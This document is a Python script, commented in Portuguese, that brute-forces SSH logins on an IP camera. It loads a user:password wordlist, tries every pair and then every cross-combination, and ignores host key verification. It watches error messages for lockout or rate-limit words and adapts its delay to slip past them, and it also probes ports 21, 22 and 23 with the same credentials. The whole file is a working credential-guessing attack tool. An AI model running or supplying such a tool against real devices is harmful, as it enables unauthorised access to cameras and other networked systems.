
import paramiko

# Configurações
host = "IP_DA_CAMERA"  # Substitua pelo IP da sua câmera
port = 22



# Carrega wordlist de arquivo e gera combinações corretas e aleatórias
import os
def load_wordlist(path):
    combos = set()
    users = set()
    passwords = set()
    if os.path.exists(path):
        with open(path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                user, pwd = line.split(':', 1)
                user = user.strip()
                pwd = pwd.strip()
                combos.add((user, pwd))
                users.add(user)
                passwords.add(pwd)
    return list(combos), list(users), list(passwords)

wordlist_path = os.path.join(os.path.dirname(__file__), 'wordlist.txt')
credentials, all_users, all_passwords = load_wordlist(wordlist_path)


import random
import time
import warnings
import socket

def try_ssh_login(host, port, username, password):
    client = paramiko.SSHClient()
    # Política customizada para não armazenar host key
    class FakeHostKeyPolicy(paramiko.MissingHostKeyPolicy):
        def missing_host_key(self, client, hostname, key):
            pass
    client.set_missing_host_key_policy(FakeHostKeyPolicy())
    try:
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            client.connect(host, port=port, username=username, password=password, timeout=5, banner_timeout=3, allow_agent=False, look_for_keys=False)
        client.close()
        return True
    except (paramiko.ssh_exception.SSHException, socket.error, socket.timeout, Exception):
        print(f"Falha ou conexão recusada para {username}:{password!r}")
        return False

# Função para testar conexão TCP simples (banner grab) nas portas 21, 22, 23
def try_tcp_login(host, port, username, password):
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        # Envia usuário:senha como teste (pode não ser aceito, mas serve para banner grab)
        try:
            s.sendall(f"{username}:{password}\r\n".encode())
        except Exception:
            pass
        try:
            banner = s.recv(1024)
            if banner:
                print(f"[Porta {port}] Banner recebido: {banner.decode(errors='ignore').strip()}")
            else:
                print(f"[Porta {port}] Nenhum banner recebido para {username}:{password!r}")
        except Exception:
            print(f"[Porta {port}] Não foi possível receber banner para {username}:{password!r}")
        s.close()
        return True
    except Exception as e:
        print(f"[Porta {port}] Falha ou conexão recusada para {username}:{password!r} - {e}")
        return False

def main(host, port):
    print(f"\nIniciando brute force em {host}:{port} ...")
    # 1. Testa todas as combinações corretas (usuário:senha do arquivo)
    cred_list = credentials.copy()
    random.shuffle(cred_list)
    delay = 0.5
    max_delay = 10
    min_delay = 0.5
    block_keywords = ["block", "too many", "rate", "denied", "flood", "ban", "wait", "temporarily", "reset", "unavailable"]
    block_count = 0
    for username, password in cred_list:
        print(f"Tentando {username}:{password!r}...")
        blocked = False
        try:
            if try_ssh_login(host, port, username, password):
                print(f"SUCESSO! Credencial encontrada: {username}:{password!r}")
                return
        except Exception as e:
            msg = str(e).lower()
            if any(x in msg for x in block_keywords):
                block_count += 1
                delay = min(delay * 2, max_delay)
                print(f"[!] Possível bloqueio detectado. Aumentando tempo de espera para {delay} segundos. (bloqueios consecutivos: {block_count})")
                blocked = True
        # Testa também nas portas 21, 22, 23
        for p in [21, 22, 23]:
            try_tcp_login(host, p, username, password)
        time.sleep(delay)
        if not blocked and delay > min_delay:
            delay = max(delay - 0.5, min_delay)
            block_count = 0

    # 2. Testa combinações aleatórias de usuário e senha (cross)
    print("\nTestando combinações aleatórias de usuário e senha...")
    random.shuffle(all_users)
    random.shuffle(all_passwords)
    cross_tried = set(cred_list)
    for user in all_users:
        for pwd in all_passwords:
            if (user, pwd) in cross_tried:
                continue
            print(f"Tentando {user}:{pwd!r} (aleatória)...")
            blocked = False
            try:
                if try_ssh_login(host, port, user, pwd):
                    print(f"SUCESSO! Credencial encontrada: {user}:{pwd!r}")
                    return
            except Exception as e:
                msg = str(e).lower()
                if any(x in msg for x in block_keywords):
                    block_count += 1
                    delay = min(delay * 2, max_delay)
                    print(f"[!] Possível bloqueio detectado. Aumentando tempo de espera para {delay} segundos. (bloqueios consecutivos: {block_count})")
                    blocked = True
            # Testa também nas portas 21, 22, 23
            for p in [21, 22, 23]:
                try_tcp_login(host, p, user, pwd)
            time.sleep(delay)
            if not blocked and delay > min_delay:
                delay = max(delay - 0.5, min_delay)
                block_count = 0
            cross_tried.add((user, pwd))
    print("Nenhuma credencial funcionou.")
